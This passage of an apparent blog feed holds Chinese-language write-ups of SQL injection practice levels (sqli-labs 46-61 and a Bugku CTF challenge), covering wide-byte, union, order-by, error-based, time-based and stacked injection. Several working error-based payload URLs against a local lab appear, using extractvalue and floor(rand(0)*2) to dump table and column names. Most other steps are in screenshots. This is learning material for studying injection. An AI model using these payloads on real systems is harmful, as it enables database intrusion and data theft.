運’，从而使单引号闭合（逃逸），进行注入攻击</p><p>当mysql接受客户端的数据后，会认为它的编码是character_set_client，然后将之转换成character_set_connection的编码，然后进入具体表和字段后，在转换成字段响应的编码，当查询结果产生后，会从表和字段的编码转换成character_set_results编码，返回给客户端</p><p>于是我们开始使用宽字节注入，发现开始报错了</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bugkuctf-sql1/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆一下查询字段数量，发现是2 </p><p><img src="/img/bugkuctf-sql1/7.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bugkuctf-sql1/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆数据库，发现数据库名为sql5 </p><p><img src="/img/bugkuctf-sql1/9.png" alt=""></p><p>爆数据表，发现有key和test两个数据表 </p><p><img src="/img/bugkuctf-sql1/10.png" alt=""></p><p>接下来爆列 </p><p><img src="/img/bugkuctf-sql1/11.png" alt=""></p><p>可以发现出现了问题，原来是mysql中的转义函数将’test’的两个单引号前面都加了\进行转义</p><p>因为题目有提示在key表的string字段下，于是查询</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bugkuctf-sql1/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现又出现了错误，查询后发现在用<code>key</code>替换key,或者用sql5.key，才能查询到结果 </p><p><img src="/img/bugkuctf-sql1/13.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      Bugkuctf-sql
    
    </summary>
    
      <category term="Bugkuctf-sql" scheme="https://Foxgrin.github.io/categories/Bugkuctf-sql/"/>
    
    
      <category term="sql" scheme="https://Foxgrin.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>sql-labs54-61</title>
    <link href="https://Foxgrin.github.io//posts/58593/"/>
    <id>https://Foxgrin.github.io//posts/58593/</id>
    <published>2018-07-09T17:49:00.000Z</published>
    <updated>2018-07-10T08:31:49.435Z</updated>
    
    <content type="html"><![CDATA[<p>总结了sql-labs的一些挑战关卡<a id="more"></a></p><h2 id="Less54-61"><a href="#Less54-61" class="headerlink" title="Less54-61"></a>Less54-61</h2><h3 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h3><p>这里开始进入挑战关卡，明显比前面难度提升了很多</p><p>直接看源代码吧</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>首先导入两个php文件</p><p>先看看sql-connect-1.php</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>连接mysql数据库，选择challenges这个数据库</p><p>再看看functions.php</p><p>里面定义了一堆函数，后面会一个个用到，我们先放着继续看下面的代码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这句代码将php文件的路径取了出来，我们把$pag值输出到文件看看 </p><p><img src="/img/sql-labs54-61/4.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>继续看下面 </p><p><img src="/img/sql-labs54-61/6.png" alt=""></p><p>利用到functions里面的函数了，看看table_name这个函数 </p><p><img src="/img/sql-labs54-61/7.png" alt=""></p><p>在mysql命令行输入 </p><p><img src="/img/sql-labs54-61/8.png" alt=""></p><p>将取到的表名赋值给$table </p><p><img src="/img/sql-labs54-61/9.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>将取得的两个列名分别赋值给两个变量 </p><p>接着来到判断语句 </p><p><img src="/img/sql-labs54-61/13.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>当我们一开始还没有点击提交和重置按钮时 </p><p><img src="/img/sql-labs54-61/15.png" alt=""></p><p>来到else语句，然后一开始cookie字段中没有challenge值</p><p>执行data函数</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>返回sessid值</p><p>然后设置cookie值</p><p>然后需要我们get传入id值，输入id值后</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>执行这个函数 </p><p><img src="/img/sql-labs54-61/19.png" alt=""></p><p>一开始时tryy值为0 </p><p><img src="/img/sql-labs54-61/20.png" alt=""></p><p>可见这个tryy值就是我们输入id的次数</p><p>当我们输入Id的次数大于10时，就执行</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>删除cookie中challenge字段值</p><p>并且重定向到另一个php文件同时get一个id值，值为</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/22.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>而这个php就是检测如果不存在challenges数据库的话就建立challenges这个数据库 ，并建立一个表，这个表的表名是随机的，见如下代码 </p><p><img src="/img/sql-labs54-61/23.png" alt=""></p><p>并往这个表中添加数据 </p><p><img src="/img/sql-labs54-61/24.png" alt=""></p><p>当我们post key值后点击提交按钮</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/25.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>则进行一个判断的sql语句</p><p>如果我们post值在col1列中，则返回1，否则不返回</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/26.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后成功提交key后，重定向到建立表的php，重新建立challenges表</p><p>也就是说，这关整体思路就是利用id值进行注入，有10次尝试的机会，一开始已经告诉我们表名是challenges，要在表中拿到key值</p><p>那么我们开始注入</p><p>首先一开始仍然是判断id有没有被引号包裹</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/27.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现被单引号包裹，那么接下来判断返回列数 </p><p><img src="/img/sql-labs54-61/28.png" alt=""></p><p>返回3列</p><p>那就可以联合注入了</p><p>爆数据库</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/29.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆表</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/30.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>爆列</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/31.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>我们要找的key应该是在第三个列 </p><p><img src="/img/sql-labs54-61/32.png" alt=""></p><p>最后报出key，提交 </p><p><img src="/img/sql-labs54-61/33.png" alt=""></p><h3 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h3><p>这里没有报错信息，id被()包裹，尝试次数为14次，其他和之前关卡没有什么区别 </p><p><img src="/img/sql-labs54-61/34.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/35.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h3><p>Id被(‘’)包裹，剩下的跟之前关卡一样 </p><p><img src="/img/sql-labs54-61/36.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/37.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/38.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h3><p>Id被””包裹，剩下的和之前一样 </p><p><img src="/img/sql-labs54-61/39.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/40.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/41.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/42.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h3><p>这关输入id值发现并没有返回正确信息，而且这里尝试次数仅为5次</p><p>看一下源代码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/43.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这里定义了一个数组，并且将用了一个数组顺序反转的函数array_reverse()</p><p>写个test测试一下</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/44.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/45.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>如果是关联数组 </p><p><img src="/img/sql-labs54-61/46.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/47.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后根据我们输入的id值进行mysql查询，将查询结果的id值作为数组的索引</p><p>所以输出一定是数组里的内容，不可能得到我们想要的信息，但是这里有报错信息显示，所以我们可以考虑用报错注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/48.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/49.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/50.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/51.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Less-59"><a href="#Less-59" class="headerlink" title="Less-59"></a>Less-59</h3><p>这里id没有被引号包裹，其他跟之前一样 </p><p><img src="/img/sql-labs54-61/52.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/53.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/54.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/55.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Less-60"><a href="#Less-60" class="headerlink" title="Less-60"></a>Less-60</h3><p>Id被（“”）包裹，其他跟之前一样 </p><p><img src="/img/sql-labs54-61/56.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/57.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/58.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/59.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Less-61"><a href="#Less-61" class="headerlink" title="Less-61"></a>Less-61</h3><p>这关id被((‘’))包裹，其他跟之前一样 </p><p><img src="/img/sql-labs54-61/60.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/61.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/62.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/63.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure>]]></content>
    
    <summary type="html">
    
      sql-labs54-61
    
    </summary>
    
      <category term="sql-labs" scheme="https://Foxgrin.github.io/categories/sql-labs/"/>
    
    
      <category term="sql" scheme="https://Foxgrin.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>sql-labs50-53</title>
    <link href="https://Foxgrin.github.io//posts/58721/"/>
    <id>https://Foxgrin.github.io//posts/58721/</id>
    <published>2018-07-09T09:08:00.000Z</published>
    <updated>2018-07-09T13:33:44.951Z</updated>
    
    <content type="html"><![CDATA[<p>总结了sql-labs中关于order by 注入和堆叠注入结合的关卡<a id="more"></a></p><h2 id="Less50-53"><a href="#Less50-53" class="headerlink" title="Less50-53"></a>Less50-53</h2><h3 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h3><p>输入sort=1,2,3得到正常排序的表，输入sort=1’和sort=1”都报错，说明没有引号包裹</p><p>先试试rand()</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs50-53/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再试试报错注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>延时注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现都可以正常注入</p><p>看一下源代码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现多重查询</p><p>说明这关可以进行堆叠注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现添加了新的一行 </p><p><img src="/img/sql-labs46-49/12.png" alt=""></p><p>被单引号包裹 </p><p><img src="/img/sql-labs46-49/13.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>被单引号包裹，没有报错信息</p><p>对堆叠注入没有影响</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>被单引号包裹，并且没有报错，依然对堆叠没有影响 </p><p><img src="/img/sql-labs46-49/19.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/20.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure>]]></content>
    
    <summary type="html">
    
      sql-labs50-53
    
    </summary>
    
      <category term="sql-labs" scheme="https://Foxgrin.github.io/categories/sql-labs/"/>
    
    
      <category term="sql" scheme="https://Foxgrin.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>sql-labs46-49</title>
    <link href="https://Foxgrin.github.io//posts/15069/"/>
    <id>https://Foxgrin.github.io//posts/15069/</id>
    <published>2018-07-09T08:38:00.000Z</published>
    <updated>2018-07-09T13:33:44.951Z</updated>
    
    <content type="html"><![CDATA[<p>总结了sql-labs中关于order by后面的注入的一些关卡<a id="more"></a></p><h2 id="Less46-49"><a href="#Less46-49" class="headerlink" title="Less46-49"></a>Less46-49</h2><h3 id="Less46"><a href="#Less46" class="headerlink" title="Less46"></a>Less46</h3><p>首先页面呈现 </p><p><img src="/img/sql-labs46-49/1.png" alt=""></p><p>要我们get方式输入一个名为sort的参数</p><p>那我们输入/?sort=1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现输出了users表里面的信息 </p><p><img src="/img/sql-labs46-49/3.png" alt=""></p><p>输入sort=2时，发现排序变化了，按照第二列username的值进行了排序，于是猜测sql语句为select * from users order by get[‘sort’]，</p><p>但是，又有个问题，之前的关卡都是将查询的结果利用mysql_fetch_array($result)=$row，这样都是输出一行结果，为什么这关输出了所有的结果</p><p>看一下源代码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>Sql语句与猜想的一样 </p><p><img src="/img/sql-labs46-49/5.png" alt=""></p><p>如果查询的结果不为空，那么</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>建立一个表格</p><p>Th标签能使里面的文件加粗并居中，td标签里的文本是默认向左对齐，不加粗</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这是最关键的代码，和之前关卡不一样，这里用到了新的一个函数，mysql_fetch_assoc()</p><p>经过查询，这个函数与mysql_fetch_array区别只在于前者返回的是关联数组，而后者既能返回关联数组又能返回索引数组</p><p>而要返回多个结果，就需要while循环，如果不用while循环，那么只能返回一个查询结果</p><p>源代码搞懂了，那么怎么进行注入呢</p><p>输入sort=1 desc，变成降序排列，默认是asc，也就是升序排列</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>我们通过sql语句观察出这题注入点应该是order by 后面的数字</p><p>先认识一个随机查询，select * from users order by rand()</p><p>Rand()函数是随机产生一个0到1之间的数字</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看出两次产生的是不同的随机数</p><p>而如果在括号内指定参数即rand(0)和rand(1)，则会产生固定的随机数种子</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>随机查询就是利用rand()函数产生不同的随机数种子，这些产生的随机数进行order by 排序，order by后面的参数如果是产生固定的随机数种子，随机排序的表就是固定的 </p><p><img src="/img/sql-labs46-49/11.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>于是我们利用在rand()函数的参数中构造逻辑表达式，根据返回的表判断逻辑表达式的真假，从而进行注入，比如/?sort=rand(ascii(substr(database(),1,1))=115) </p><p><img src="/img/sql-labs46-49/13.png" alt=""></p><p>发现返回是rand(false)也就是rand(0)的随机排序表，说明上述逻辑表达式为假 </p><p>我们再先试试union查询可不可以 </p><p><img src="/img/sql-labs46-49/14.png" alt=""></p><p>报错了，是不是union 和order by不能一起使用了，我们在mysql命令行中测试一下，发现以下两种是不会报错的，一种是在联合两边的select 语句分别加括号，一种是将order by放入后面的select语句 </p><p><img src="/img/sql-labs46-49/15.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>为什么呢，经过查询发现union查询并不是只是简简单单的将两个子查询结果进行拼接，而是将两个查询结果统一查询，所以order by 应该放在最后一个子查询中</p><p>然而这关我们是在order by后进行注入，所以不能使用union注入</p><p>那能不能使用延时注入呢，也就是通过order by 1 and if(,1,sleep())</p><p>我们先在mysql命令行中测试一下</p><p>发现sleep了18秒，猜测是因为有18秒的原因，至于为什么是排序成这样，请教学长，学长也无法解释，暂时将这个问题搁在一边，但是抛开这个问题，利用这个方法进行延时注入是可行的，经过测试只要保证order by后面的参数不会报错，就能执行and后面的语句，经过测试带小数的数字，任何字符和字符串，列名，1,2,3都不会报错，但只有列名和1,2,3当做参数，才会对表排序，其他都会得到原来的表</p><p>下面试试延时注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功延时9秒</p><p>再试试能不能通过and 进行报错注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>非常完美，那么就可以进行熟悉爆表爆列了 </p><p><a href="http://127.0.0.1/sqli/sqli-labs/Less-46/?sort=1%20and%20extractvalue(1,concat(0x3a,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),0x3a))" target="_blank" rel="noopener">http://127.0.0.1/sqli/sqli-labs/Less-46/?sort=1%20and%20extractvalue(1,concat(0x3a,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),0x3a))</a> </p><p><img src="/img/sql-labs46-49/19.png" alt=""></p><p><a href="http://127.0.0.1/sqli/sqli-labs/Less-46/?sort=1%20and%20extractvalue(1,concat(0x3a,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27),0x3a))" target="_blank" rel="noopener">http://127.0.0.1/sqli/sqli-labs/Less-46/?sort=1%20and%20extractvalue(1,concat(0x3a,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27),0x3a))</a> </p><p><img src="/img/sql-labs46-49/20.png" alt=""></p><p>那么count(<em>),group by,floor(rand(0)</em>2)的报错注入能不能在这里运用呢 </p><p><a href="http://127.0.0.1/sqli/sqli-labs/Less-46/?sort=1%20and%201=(select%20count(*)%20from%20information_schema.columns%20group%20by%20concat(0x3a,database(),0x3a,floor(rand(0)*2)))" target="_blank" rel="noopener">http://127.0.0.1/sqli/sqli-labs/Less-46/?sort=1%20and%201=(select%20count(*)%20from%20information_schema.columns%20group%20by%20concat(0x3a,database(),0x3a,floor(rand(0)*2)))</a> </p><p><img src="/img/sql-labs46-49/21.png" alt=""></p><p>没问题，但除此之外还有一种方法进行这种报错注入，就是利用sort=(select …)进行报错注入 </p><p><img src="/img/sql-labs46-49/22.png" alt=""></p><p>还有一种方法，可以在order by后面的procedure analyse参数进行报错注入 </p><p><img src="/img/sql-labs46-49/23.png" alt=""></p><p>但是这里又碰到一个问题，procedure analyse后面的报错注入，加入子查询语句会报错，原因未知，可能是语法错误，暂时来看这个方法只能注出库名，用户名和版本 </p><p><img src="/img/sql-labs46-49/24.png" alt=""></p><p>Into outfile 注入 </p><p><img src="/img/sql-labs46-49/25.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/26.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h3><p>输入sort=1,2,3发现都得到原来的表，猜测sort可能被引号包裹，成为字符，所以排序后仍为原来的表，加个单引号 </p><p><img src="/img/sql-labs46-49/27.png" alt=""></p><p>发现报错了，果然被单引号包裹了</p><p>先试试随机查询rand()</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/28.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>还是原来的表，说明这里用rand()是不行的</p><p>那么用and +报错注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/29.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/30.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/31.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>延时注入 </p><p><img src="/img/sql-labs46-49/32.png" alt=""></p><p>另外一种报错注入，经过测试必须通过and 后面才能执行，之前关卡的sort=(select …)方法测试不会报错</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/33.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>Procedure analyse 报错注入 </p><p><img src="/img/sql-labs46-49/34.png" alt=""></p><h3 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h3><p>输入sort=1,2,3，发现正常排序，说明sort没有被引号包裹，输入1’</p><p>发现没有报错，说明不返回报错信息，所以这关不能用报错注入</p><p>排除sort=(select count(*))注入和and +报错和procedure analyse 报错注入</p><p>那么试试sort=rand()注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/35.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这是rand(true)排序的表 </p><p><img src="/img/sql-labs46-49/36.png" alt=""></p><p>这是rand(false)排序的表</p><p>再试试 and +延时注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/37.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>导出文件 </p><p><img src="/img/sql-labs46-49/38.png" alt=""></p><h3 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h3><p>输入sort=1,2,3发现都得到原来的表，说明有引号包裹，在输入sort=1’，没有输出表，没有报错，说明被单引号包裹，并且没有返回报错信息</p><p>那么排除了报错注入，rand()，那只能延时注入和导出文件了</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/39.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>文件导出 </p><p><img src="/img/sql-labs46-49/40.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      sql-labs46-49
    
    </summary>
    
      <category term="sql-labs" scheme="https://Foxgrin.github.io/categories/sql-labs/"/>
    
    
      <category term="sql" scheme="https://Foxgrin.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
